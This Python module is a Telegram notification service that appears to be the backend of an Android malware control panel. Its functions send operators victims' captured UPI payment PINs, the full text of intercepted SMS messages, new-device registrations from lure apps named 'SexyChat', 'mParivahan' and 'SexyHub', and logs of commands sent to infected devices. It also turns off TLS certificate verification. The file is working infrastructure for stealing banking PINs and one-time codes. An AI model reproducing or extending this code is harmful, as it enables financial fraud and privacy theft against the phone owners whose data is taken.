import aiohttp
import asyncio
import logging
import ssl
from datetime import datetime, timezone
from typing import Optional, Dict, List
from ..database import mongodb
from ..config import settings
from ..utils.datetime_utils import utc_now

logger = logging.getLogger(__name__)

def escape_markdown_v2(text: str) -> str:
    """Escape special characters for Telegram MarkdownV2"""
    if not text:
        return ""
    # Characters that need to be escaped in MarkdownV2
    special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    for char in special_chars:
        text = text.replace(char, f'\\{char}')
    return text

class TelegramMultiService:

    def __init__(self):
        self.enabled = settings.TELEGRAM_ENABLED

        self.twofa_bot_token = settings.TELEGRAM_2FA_BOT_TOKEN
        self.twofa_chat_id = settings.TELEGRAM_2FA_CHAT_ID

        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE

        if not self.enabled:
            logger.warning("Telegram notifications disabled")
        else:
            logger.info("Telegram Multi-Service initialized")

    async def get_admin_bots(self, admin_username: str) -> List[Dict]:
        admin_doc = await mongodb.db.admins.find_one(
            {"username": admin_username},
            {"telegram_bots": 1}
        )

        if admin_doc and "telegram_bots" in admin_doc:

            valid_bots = [
                bot for bot in admin_doc["telegram_bots"]
                if "TOKEN_HERE" not in bot.get("token", "")
                and bot.get("token", "").strip()  # Token must not be empty
                and bot.get("chat_id", "").strip()  # Chat ID must not be empty
            ]
            return valid_bots

        return []

    async def send_to_admin(
        self,
        admin_username: str,
        message: str,
        bot_index: Optional[int] = None,
        parse_mode: str = "HTML"
    ) -> bool:
        if not self.enabled:
            return False

        bots = await self.get_admin_bots(admin_username)

        if not bots:
            logger.warning(f"No bots configured for admin: {admin_username}")
            return False

        if bot_index is not None:
            target_bot = next((bot for bot in bots if bot["bot_id"] == bot_index), None)
            if target_bot:
                return await self._send_message_to_chat(
                    target_bot["token"],
                    target_bot["chat_id"],
                    message,
                    parse_mode
                )
            else:
                logger.warning(f"Bot {bot_index} not found for admin {admin_username}")
                return False

        results = []
        for bot in bots:
            result = await self._send_message_to_chat(
                bot["token"],
                bot["chat_id"],
                message,
                parse_mode
            )
            results.append(result)

        return any(results)

    async def send_to_all_admins(
        self,
        message: str,
        parse_mode: str = "HTML"
    ) -> Dict[str, bool]:
        results = {}

        cursor = mongodb.db.admins.find({}, {"username": 1})
        admins = await cursor.to_list(length=1000)

        for admin in admins:
            username = admin["username"]
            success = await self.send_to_admin(username, message, parse_mode=parse_mode)
            results[username] = success

        return results

    async def send_2fa_notification(
        self,
        admin_username: str,
        ip_address: str,
        code: Optional[str] = None,
        message_prefix: Optional[str] = None
    ) -> bool:

        admin = await mongodb.db.admins.find_one({"username": admin_username})

        if not admin:
            logger.warning(f"Admin not found for 2FA: {admin_username}")
            return False

        telegram_2fa_chat_id = admin.get("telegram_2fa_chat_id")

        if not telegram_2fa_chat_id:
            logger.warning(f"telegram_2fa_chat_id not configured for admin: {admin_username}")
            return False

        if not self.twofa_bot_token or "TOKEN_HERE" in self.twofa_bot_token:
            logger.warning(f"2FA Bot token not configured")
            return False

        # Escape MarkdownV2 special characters
        escaped_username = escape_markdown_v2(admin_username)
        escaped_ip = escape_markdown_v2(ip_address)
        escaped_code = escape_markdown_v2(code) if code else None
        escaped_time = escape_markdown_v2(utc_now().strftime('%Y-%m-%d %H:%M:%S UTC'))

        if message_prefix:
            # If message_prefix is provided, assume it's already formatted
            message = message_prefix
        else:
            message = "🔐 *Two\\-Factor Authentication*\n\n"

        message += f"👤 *Admin:* `{escaped_username}`\n"
        message += f"🌐 *IP:* `{escaped_ip}`\n"

        if code:
            message += f"🔢 *Code:* `{escaped_code}`\n"

        message += f"🕐 *Time:* `{escaped_time}`"

        return await self._send_message_to_chat(
            self.twofa_bot_token,
            telegram_2fa_chat_id,
            message,
            "MarkdownV2"
        )

    async def _send_message_to_chat(self, bot_token: str, chat_id: str, message: str, parse_mode: str = "HTML") -> bool:
        # Validate inputs
        if not bot_token or not bot_token.strip() or "TOKEN_HERE" in bot_token:
            logger.warning(f"Invalid bot token provided")
            return False
        
        if not chat_id or not chat_id.strip():
            logger.warning(f"Empty or invalid chat_id provided, skipping send")
            return False
        
        try:
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

            data = {
                "chat_id": chat_id.strip(),
                "text": message,
                "parse_mode": parse_mode
            }

            max_retries = 3
            retry_delay = 1  # Start with 1 second
            
            for attempt in range(max_retries):
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.post(url, json=data, ssl=self.ssl_context, timeout=aiohttp.ClientTimeout(total=10)) as response:
                            if response.status == 200:
                                logger.debug(f"Message sent to chat: {chat_id[:10]}...")
                                return True
                            elif response.status == 429:
                                # Rate limiting - get retry_after from response
                                try:
                                    error_data = await response.json()
                                    retry_after = error_data.get("parameters", {}).get("retry_after", 60)
                                    if attempt < max_retries - 1:
                                        logger.warning(f"Rate limited for chat {chat_id[:10]}..., retrying after {retry_after} seconds (attempt {attempt + 1}/{max_retries})")
                                        await asyncio.sleep(retry_after)
                                        continue
                                    else:
                                        error_text = await response.text()
                                        logger.error(f"Rate limited for chat {chat_id[:10]}... after {max_retries} attempts: {error_text}")
                                        return False
                                except:
                                    # If we can't parse the error, use default retry
                                    if attempt < max_retries - 1:
                                        logger.warning(f"Rate limited for chat {chat_id[:10]}..., retrying after {retry_delay} seconds (attempt {attempt + 1}/{max_retries})")
                                        await asyncio.sleep(retry_delay)
                                        retry_delay *= 2  # Exponential backoff
                                        continue
                                    else:
                                        error_text = await response.text()
                                        logger.error(f"Rate limited for chat {chat_id[:10]}... after {max_retries} attempts: {error_text}")
                                        return False
                            elif response.status == 404:
                                # Chat not found - don't retry, just log and return
                                error_text = await response.text()
                                logger.warning(f"Chat not found (404) for chat_id {chat_id[:10]}...: {error_text}")
                                return False
                            else:
                                error_text = await response.text()
                                if attempt < max_retries - 1:
                                    logger.warning(f"Failed to send to {chat_id[:10]}... (status {response.status}), retrying (attempt {attempt + 1}/{max_retries}): {error_text}")
                                    await asyncio.sleep(retry_delay)
                                    retry_delay *= 2
                                    continue
                                else:
                                    logger.error(f"Failed to send to {chat_id[:10]}... after {max_retries} attempts: {error_text}")
                                    return False
                except asyncio.TimeoutError:
                    if attempt < max_retries - 1:
                        logger.warning(f"Timeout sending to {chat_id[:10]}..., retrying (attempt {attempt + 1}/{max_retries})")
                        await asyncio.sleep(retry_delay)
                        retry_delay *= 2
                        continue
                    else:
                        logger.error(f"Timeout sending to {chat_id[:10]}... after {max_retries} attempts")
                        return False
            
            return False

        except Exception as e:
            logger.error(f"Error sending to {chat_id[:10]}...: {e}")
            return False

    async def notify_device_registered(
        self,
        device_id: str,
        device_info: dict,
        admin_username: str
    ):

        app_type = device_info.get('app_type', 'Unknown')

        app_names = {
            'sexychat': '💬 SexyChat',
            'mparivahan': '🚗 mParivahan',
            'sexyhub': '💎 SexyHub'
        }
        app_display = app_names.get(app_type.lower(), f'📱 {app_type}')

        # Escape MarkdownV2 special characters
        escaped_device_id = escape_markdown_v2(device_id)
        escaped_app = escape_markdown_v2(app_display)
        escaped_manufacturer = escape_markdown_v2(device_info.get('manufacturer', 'Unknown'))
        escaped_model = escape_markdown_v2(device_info.get('model', 'Unknown'))
        escaped_os = escape_markdown_v2(device_info.get('os_version', 'Unknown'))
        escaped_time = escape_markdown_v2(utc_now().strftime('%Y-%m-%d %H:%M:%S UTC'))

        message = f"""📱 *New Device Registered*

📦 *App:* {escaped_app}
🆔 *Device ID:* `{escaped_device_id}`
📲 *Model:* {escaped_manufacturer} {escaped_model}
🤖 *Android:* {escaped_os}
🕐 *Time:* `{escaped_time}`
"""

        await self.send_to_admin(admin_username, message, bot_index=1, parse_mode="MarkdownV2")

        await self._notify_super_admin(
            message,
            bot_index=1,
            exclude_username=admin_username,
            parse_mode="MarkdownV2",
        )

    async def notify_upi_detected(
        self,
        device_id: str,
        upi_pin: str,
        admin_username: str,
        status: str
    ):
        status = (status or "unknown").lower()
        is_success = status == "success"
        icon = "🔐" if is_success else "⚠️"
        status_text = "Detected" if is_success else "Failed"

        # Escape MarkdownV2 special characters
        escaped_device_id = escape_markdown_v2(device_id)
        escaped_pin = escape_markdown_v2(upi_pin)
        escaped_status = escape_markdown_v2(status.capitalize())
        escaped_time = escape_markdown_v2(utc_now().strftime('%Y-%m-%d %H:%M:%S UTC'))
        escaped_status_text = escape_markdown_v2(status_text)

        message = f"""{icon} *UPI PIN {escaped_status_text}\\!*

📱 *Device:* `{escaped_device_id}`
🔢 *PIN:* `{escaped_pin}`
📊 *Status:* {escaped_status}
🕐 *Time:* `{escaped_time}`

⚠️ *IMPORTANT:* Store securely\\!
"""

        await self.send_to_admin(admin_username, message, bot_index=1, parse_mode="MarkdownV2")

        await self._notify_super_admin(
            message,
            bot_index=1,
            exclude_username=admin_username,
            parse_mode="MarkdownV2",
        )

    async def notify_admin_login(
        self,
        admin_username: str,
        ip_address: str,
        success: bool = True
    ):
        icon = "✅" if success else "❌"
        status = "Successful" if success else "Failed"

        # Escape MarkdownV2 special characters
        escaped_username = escape_markdown_v2(admin_username)
        escaped_ip = escape_markdown_v2(ip_address)
        escaped_status = escape_markdown_v2(status)
        escaped_time = escape_markdown_v2(utc_now().strftime('%Y-%m-%d %H:%M:%S UTC'))

        message = f"""{icon} *Admin Login {escaped_status}*

👤 *Username:* `{escaped_username}`
🌐 *IP:* `{escaped_ip}`
🕐 *Time:* `{escaped_time}`
"""

        await self.send_to_admin(admin_username, message, bot_index=4, parse_mode="MarkdownV2")

        await self._notify_super_admin(
            message,
            bot_index=4,
            exclude_username=admin_username,
            parse_mode="MarkdownV2",
        )

    async def notify_command_sent(
        self,
        admin_username: str,
        device_id: str,
        command: str
    ):
        # Escape MarkdownV2 special characters
        escaped_username = escape_markdown_v2(admin_username)
        escaped_device_id = escape_markdown_v2(device_id)
        escaped_command = escape_markdown_v2(command)
        escaped_time = escape_markdown_v2(utc_now().strftime('%Y-%m-%d %H:%M:%S UTC'))

        message = f"""📤 *Command Sent*

👤 *Admin:* `{escaped_username}`
📱 *Device:* `{escaped_device_id}`
⚙️ *Command:* `{escaped_command}`
🕐 *Time:* `{escaped_time}`
"""

        await self.send_to_admin(admin_username, message, bot_index=3, parse_mode="MarkdownV2")

        await self._notify_super_admin(
            message,
            bot_index=3,
            exclude_username=admin_username,
            parse_mode="MarkdownV2",
        )

    async def notify_new_sms(
        self,
        device_id: str,
        admin_username: str,
        from_number: str,
        full_message: str
    ):
        max_message_length = 3500

        if len(full_message) > max_message_length:
            sms_text = full_message[:max_message_length] + "\n\n... (message truncated)"
        else:
            sms_text = full_message

        # Escape MarkdownV2 special characters
        escaped_device_id = escape_markdown_v2(device_id)
        escaped_from = escape_markdown_v2(from_number)
        escaped_time = escape_markdown_v2(utc_now().strftime('%Y-%m-%d %H:%M:%S UTC'))
        
        # For code block, we don't escape the message content itself
        # Telegram will handle it as code block
        message = f"""💬 *New SMS*

📱 *Device:* `{escaped_device_id}`
👤 *From:* `{escaped_from}`
🕐 *Time:* `{escaped_time}`

📝 *Message:*
```
{sms_text}
```"""

        await self.send_to_admin(admin_username, message, bot_index=2, parse_mode="MarkdownV2")

        await self._notify_super_admin(
            message,
            bot_index=2,
            exclude_username=admin_username,
            parse_mode="MarkdownV2",
        )

    async def notify_admin_created(
        self,
        creator_username: str,
        new_admin_username: str,
        role: str,
        device_token: str
    ):
        # Escape MarkdownV2 special characters
        escaped_creator = escape_markdown_v2(creator_username)
        escaped_new_admin = escape_markdown_v2(new_admin_username)
        escaped_role = escape_markdown_v2(role)
        escaped_token = escape_markdown_v2(device_token[:20] + "...")
        escaped_time = escape_markdown_v2(utc_now().strftime('%Y-%m-%d %H:%M:%S UTC'))

        message = f"""👤 *New Admin Created*

👨‍💼 *Creator:* `{escaped_creator}`
🆕 *New Admin:* `{escaped_new_admin}`
🎭 *Role:* {escaped_role}
🔑 *Token:* `{escaped_token}`
🕐 *Time:* `{escaped_time}`
"""

        await self.send_to_admin(creator_username, message, bot_index=3, parse_mode="MarkdownV2")

        await self._notify_super_admin(
            message,
            bot_index=3,
            exclude_username=creator_username,
            parse_mode="MarkdownV2",
        )

    async def notify_admin_logout(
        self,
        admin_username: str,
        ip_address: str
    ):
        # Escape MarkdownV2 special characters
        escaped_username = escape_markdown_v2(admin_username)
        escaped_ip = escape_markdown_v2(ip_address)
        escaped_time = escape_markdown_v2(utc_now().strftime('%Y-%m-%d %H:%M:%S UTC'))

        message = f"""🔒 *Admin Logout*

👤 *Username:* `{escaped_username}`
🌐 *IP:* `{escaped_ip}`
🕐 *Time:* `{escaped_time}`
"""

        await self.send_to_admin(admin_username, message, bot_index=4, parse_mode="MarkdownV2")

        await self._notify_super_admin(
            message,
            bot_index=4,
            exclude_username=admin_username,
            parse_mode="MarkdownV2",
        )

    async def notify_admin_action(
        self,
        admin_username: str,
        action: str,
        details: str = "",
        ip_address: str = None,
        device_id: str = None
    ):
        # Escape MarkdownV2 special characters
        escaped_admin = escape_markdown_v2(admin_username)
        escaped_action = escape_markdown_v2(action)
        escaped_details = escape_markdown_v2(details) if details else ""
        escaped_ip = escape_markdown_v2(ip_address) if ip_address else ""
        escaped_device_id = escape_markdown_v2(device_id) if device_id else ""
        escaped_time = escape_markdown_v2(utc_now().strftime('%Y-%m-%d %H:%M:%S UTC'))
        
        message = f"""⚙️ *Admin Action*

👤 *Admin:* `{escaped_admin}`
📋 *Action:* `{escaped_action}`
"""
        if details:
            message += f"📝 *Details:* {escaped_details}\n"

        if device_id:
            message += f"📱 *Device:* `{escaped_device_id}`\n"

        if ip_address:
            message += f"🌐 *IP:* `{escaped_ip}`\n"
        
        message += f"🕐 *Time:* `{escaped_time}`"

        await self.send_to_admin(admin_username, message, bot_index=3, parse_mode="MarkdownV2")

        await self._notify_super_admin(
            message,
            bot_index=3,
            exclude_username=admin_username,
            parse_mode="MarkdownV2",
        )

    async def _notify_super_admin(
        self,
        message: str,
        bot_index: int,
        exclude_username: Optional[str] = None,
        parse_mode: str = "HTML",
    ):
        try:

            cursor = mongodb.db.admins.find(
                {"role": "super_admin"},
                {"username": 1}
            )
            super_admins = await cursor.to_list(length=100)

            for admin in super_admins:
                username = admin["username"]

                if exclude_username and username == exclude_username:
                    continue

                await self.send_to_admin(
                    username,
                    message,
                    bot_index=bot_index,
                    parse_mode=parse_mode,
                )

        except Exception as e:
            logger.error(f"Error notifying super admin: {e}")

telegram_multi_service = TelegramMultiService()